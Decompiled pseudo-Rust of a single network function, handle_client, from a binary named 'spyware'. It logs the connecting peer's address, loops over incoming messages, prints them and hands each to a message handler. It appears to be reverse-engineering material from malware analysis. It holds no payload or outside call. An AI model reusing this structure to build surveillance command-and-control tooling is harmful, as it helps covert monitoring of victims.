
  fn spyware::communication::server::handle_client::hb99b66a85b0a9c88(arg1: i32) -> i64

{
    let mut fd: i32 = arg1;
    
    if core::sync::atomic::atomic_load::h8c88032dab18ab12() < 4
    {
        goto 'label_44ce5d;
    }
    
    let mut var_e8: i16;
    std::net::tcp::TcpStream::peer_addr::h9ccf6949693ba95c(&var_e8, &fd);
    let rax_1: i16 = var_e8;
    let mut result: i64;
    let result_2: i64;
    
    if rax_1 != 2
    {
        let var_e2: i16;
        let mut var_58: i64;
        *var_58[6] = var_e2;
        let var_e6: i32;
        *var_58[2] = var_e6;
        let mut var_d8: i128;
        let var_18_1: i128 = var_d8;
        var_58 = rax_1;
        let result_3: i64 = result_2;
        let var_48: i128 = var_d8;
        let mut var_68: *mut i64 = &var_58;
        let var_60_1: fn(arg1: *mut i8) -> i64 = _$LT$core..net..socket_addr..SocketAddr$u20$as$u20$core..fmt..Display$GT$::fmt::hb8f0b665671134da;
        let mut var_a8: *mut *mut [i8; 0xf5] = &data_4b8c30;
        let var_a0_1: i64 = 1;
        let mut var_90: i128;
        *var_90[8] = 0;
        let var_98_1: *mut *mut i64 = &var_68;
        var_90 = 1;
        let rax_2: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8c70);
        var_e8 = "spyware::communication::serverUn…";
        let var_e0: i64 = 0x1e;
        var_d8 = "spyware::communication::serverUn…";
        *var_d8[8] = 0x1e;
        let mut var_c8: i128;
        var_c8 = rax_2;
        log::__private_api::log::h13afddf373bd7d7f(&var_a8, 4, &var_e8);
        'label_44ce5d:
        
        loop
        {
            spyware::communication::server::get_message::hbc00a55f19d841bb(&var_58, &fd);
            
            if var_58 == -0x7ffffffffffffff6
            {
                break;
            }
            
            var_e8 = var_58;
            var_a8 = &data_4b8c50;
            let var_a0_2: i64 = 1;
            let mut var_98_2: i64 = 8;
            let mut var_90_1: i128 = {0};
            std::io::stdio::_print::h17d6c2a1d6a6f99e(&var_a8);
            let var_28: i128;
            let var_78_1: i128 = var_28;
            let var_38: i128;
            var_90_1 = var_38;
            var_98_2 = var_48;
            var_a8 = var_e8;
            spyware::communication::server::handle_message::h02435bd595e8370d(&var_a8, &fd);
        }
        
        result = result_3;
        let mut result_1: i64 = result;
        var_a8 = &data_4b8c40;
        let var_a0_3: i64 = 1;
        let var_98_3: i64 = 8;
        let mut var_90_2: i128 = {0};
        std::io::stdio::_print::h17d6c2a1d6a6f99e(&var_a8);
        
        if core::sync::atomic::atomic_load::h8c88032dab18ab12() != 0
        {
            var_68 = &result_1;
            let var_60_2: fn(arg1: *mut i64, arg2: *mut i64) -> i64 = _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
            var_a8 = &data_4b8c60;
            let var_a0_4: i64 = 1;
            *var_90_2[8] = 0;
            let var_98_4: *mut *mut i64 = &var_68;
            var_90_2 = 1;
            let rax_4: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8c88);
            var_e8 = "spyware::communication::serverUn…";
            let var_e0_1: i64 = 0x1e;
            var_d8 = "spyware::communication::serverUn…";
            *var_d8[8] = 0x1e;
            var_c8 = rax_4;
            log::__private_api::log::h13afddf373bd7d7f(&var_a8, 1, &var_e8);
            result = result_1;
        }
    }
    else
    {
        result = result_2;
    }
    core::ptr::drop_in_place$LT$std..net..tcp..TcpStream$GT$::hf7372bfdd8ef8cfe(fd);
    result
}
